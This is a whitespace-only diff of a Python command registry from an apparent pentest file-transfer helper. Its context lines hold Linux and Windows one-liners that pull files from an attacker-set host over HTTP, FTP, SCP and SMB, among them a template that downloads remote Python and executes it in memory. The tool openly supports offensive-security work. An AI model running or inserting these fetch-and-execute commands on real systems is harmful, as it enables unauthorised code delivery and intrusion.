@@ -44,7 +44,7 @@ class SimpleCommand(Command):
                 INPUTFILE=context.input_file,
                 OUTPUTFILE=context.output_file
             )
-        
+
         # Replace {PROTO} with the actual protocol
         template = self.template.replace('{PROTO}', protocol_prefix)
         return template.format(
@@ -67,10 +67,10 @@ class CommandRegistry:
         """Add a command to the registry."""
         if os_type not in self._commands:
             raise ValueError(f"Invalid OS type: {os_type}")
-        
+
         if command_type not in self._commands[os_type]:
             self._commands[os_type][command_type] = []
-            
+
         self._commands[os_type][command_type].append(command)
 
     def get_commands(self, os_type: str, command_type: str, protocol: str) -> List[Command]:
@@ -90,7 +90,7 @@ class CommandRegistry:
 def create_default_registry() -> CommandRegistry:
     """Create and populate the default command registry."""
     registry = CommandRegistry()
-    
+
     # Linux Commands - HTTP/HTTPS
     registry.add_command('linux', 'curl',
         SimpleCommand('curl', 'curl {PROTO}://{LHOST}:{LPORT}/{INPUTFILE} -o {OUTPUTFILE}',
@@ -101,17 +101,17 @@ def create_default_registry() -> CommandRegistry:
     registry.add_command('linux', 'python',
         SimpleCommand('python-memory', 'python -c "import urllib2; exec urllib2.urlopen(\'{PROTO}://{LHOST}:{LPORT}/{INPUTFILE}\').read()"',
                      notes="In memory", protocols={'HTTP', 'HTTPS'}))
-    
+
     # Linux Commands - FTP
     registry.add_command('linux', 'ftp',
         SimpleCommand('ftp', 'ftp -n {LHOST} {LPORT} <<EOF\nuser anonymous anonymous\nget {INPUTFILE} {OUTPUTFILE}\nbye\nEOF',
                      protocols={'FTP'}))
-    
+
     # Linux Commands - SCP
     registry.add_command('linux', 'scp',
         SimpleCommand('scp', 'scp -P {LPORT} {LHOST}:{INPUTFILE} {OUTPUTFILE}',
                      protocols={'SCP'}))
-    
+
     # Linux Commands - SMB
     registry.add_command('linux', 'smbclient',
         SimpleCommand('smbclient', 'smbclient //{LHOST}/EXEGOL -U uberfile%exegol4thewin -c "get {INPUTFILE} {OUTPUTFILE}"',
@@ -142,12 +142,12 @@ def create_default_registry() -> CommandRegistry:
     registry.add_command('windows', 'wget',
         SimpleCommand('wget', 'wget "{PROTO}://{LHOST}:{LPORT}/{INPUTFILE}" -OutFile "{OUTPUTFILE}"',
                      protocols={'HTTP', 'HTTPS'}))
-    
+
     # Windows Commands - FTP
     registry.add_command('windows', 'ftp',
         SimpleCommand('ftp', 'echo open {LHOST} {LPORT}> ftp.txt && echo user anonymous anonymous>> ftp.txt && echo get {INPUTFILE} {OUTPUTFILE}>> ftp.txt && echo bye>> ftp.txt && ftp -s:ftp.txt && del ftp.txt',
                      protocols={'FTP'}))
-    
+
     # Windows Commands - SMB
     registry.add_command('windows', 'net-use',
         SimpleCommand('net-use', 'net use \\\\{LHOST}\\EXEGOL /user:uberfile exegol4thewin && copy \\\\{LHOST}\\EXEGOL\\{INPUTFILE} {OUTPUTFILE} && net use \\\\{LHOST}\\EXEGOL /delete',
@@ -159,4 +159,4 @@ def create_default_registry() -> CommandRegistry:
         SimpleCommand('robocopy', 'net use \\\\{LHOST}\\EXEGOL /user:uberfile exegol4thewin && robocopy \\\\{LHOST}\\EXEGOL . {INPUTFILE} /COPY:DAT /Z && net use \\\\{LHOST}\\EXEGOL /delete',
                      notes="Robust copy with restart capability", protocols={'SMB'}))
 
-    return registry 
+    return registry
